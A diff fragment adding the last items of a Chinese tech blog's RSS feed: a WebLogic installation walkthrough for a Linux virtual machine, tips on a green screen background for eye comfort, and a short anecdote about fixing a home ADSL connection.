+      <description>1、准备weblogic的安装介质，可以到官网http://www.oracle.com/technetwork/middleware/fusion-middleware/downloads/index.html下载weblogic用于linux的版本，通常后缀为bin（这种类型中包含jre从而不需要在虚拟机上安装jre并且进行路径的配置）&#xA;2、将安装文件通过共享的方式拷贝到虚拟机的具体目录下，如：/home中，文件名称为：wsl-linux32.bin&#xA;3、修改wsl-linux32.bin 的执行方式：在终端中执行命令 chmod a+x wsl-linux32.bin&#xA;4. 在终端中输入命令：./wsl-linux32.bin，该文件运行后，可以看到“Extracting 0%……”字样，说明开始在解压了，然后按弹出的窗口提示进行操作（与windows下图形界面安装相同）&#xA;5. 安装完成weblogic之后，可以紧接着在弹出的窗口中创建域，也可以通过命令的方式打开创建域的窗口：在安装的weblogic路径下找到utils\quickstart，运行quickstart.sh （在终端中执行的命令为：sh quickstart.sh）,然后根据提示创建域（与windows图形界面操作相同）&#xA;6.启动weblogic：运行user_projects\domains\base_domain 下的startWeblogic.sh （终端中运行的命令为：sh startWeblogic.sh）&#xA;7. 进入weblogic的控制台：http:127.0.0.1:7001/console ,配置数据源（与windows相同），启动服务&#xA;8. 访问环境，此时若在主机中不能访问系统时，将虚拟机上的访问强关闭，执行命令为：service iptables stop 关闭防火墙</description>
+    </item>
+    <item>
+      <title>为了保护眼睛，电脑桌面调暗点好</title>
+      <link>https://anwangtanmi.github.io/posts/4e71e876b4d651b412bc4f46e9845941/</link>
+      <pubDate>Wed, 21 Dec 2011 14:29:22 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/4e71e876b4d651b412bc4f46e9845941/</guid>
+      <description> 调暗点，眼睛看起来不会累的亮度的，不是每台电脑的亮度都是一模一样的，主要是看自己的 眼睛舒服 背景色设置成浅绿色，最适合阅读。特别是晚上对着电脑屏幕的时候。经试验，这种浅绿色的颜色代码是 色调(Hue)设为85， 饱和度(Sat)设为95 亮度(Lum)设为205 电脑屏幕不要用白色，因为白色对眼睛的刺激是最大的。整天对着电脑干活的，也应该注意一下。 其实，只要稍微设置一下，就能让你电脑上的窗口从白花花的颜色变成淡淡的绿色。 设置方法如下： &amp;gt;&amp;gt;在桌面点右键，依次选属性(properties)—外观(appearance) &amp;gt;&amp;gt;点右下角的高级(advanced)，然后在项目(items)的下拉菜单里选窗口(windows)&amp;gt;&amp;gt;&amp;gt;&amp;gt;点右侧的下拉菜单颜色(color)，点下方的其它(others) &amp;gt;&amp;gt;把色调(Hue)设为85，饱和度(Sat)设为90-123,亮度(Lum)设为205.(出厂时一般设为160-0-240) &amp;gt;&amp;gt;单击添加到自定义颜色(Add to custom colors)，按确定(OK)……一直确定(OK)下去。 把窗口设成绿色之后，再来把IE的网页背景也变成养眼的绿色吧： 打开IE，点击工具(TOOLS)—Internet选项(INTERNET OPTIONS)—辅助功能(Assessibility)，勾选第一个“不使用网页中指定的颜色”(ignore colors specified on web pages)，然后点“确定” (OK)——确定……退出。 OK啦，现在你就会发现你的屏幕已经变成淡淡的绿色了。这个颜色会比白色柔和许多，刚开始可能你还有些不适应，但确实对我们的眼睛有好处，大家不妨试一下。 还有~~~ 端正姿势保护眼睛，它对于缓解眼睛疲劳起着十分重要的作用。 </description>
+    </item>
+    <item>
+      <title>网络居然不通了。。。。。。。。。。。。。</title>
+      <link>https://anwangtanmi.github.io/posts/ab17ecb8deeb591292abed3c24b7e438/</link>
+      <pubDate>Sun, 12 Mar 2006 20:00:00 +0800</pubDate>
+      <guid>https://anwangtanmi.github.io/posts/ab17ecb8deeb591292abed3c24b7e438/</guid>
+      <description> 昨天搬家，以前是自己组了一个小局域网，然后搬乱了 ，线被他们弄得一塌糊涂！晕死。剩下我只好三下五除二把线重新接好。因为ADSL线和电话线要重接一下，所以拔下来了，后接好都插上去了。 却死活不通。PING通了到路由的。却PING不通DNS ，郁闷，然后打电话，电话也是通的。线路证实是好的了。&#xA;再看硬件方面网卡，猫什么都亮灯，突然发现猫的灯有异样，平常通时应该是绿灯，这时去暗的，一定出在猫上了，然后把电话线接头和猫接头在分离器上互换了一下，OK，DNS都OK了，上网流畅的感觉又来了。。。。。。。。。。，笔记本带来一插同样OK！如果要有无线路由，无线网卡，那才叫爽！。。。。&#xA;哈哈！ </description>
+    </item>
+  </channel>
+</rss>
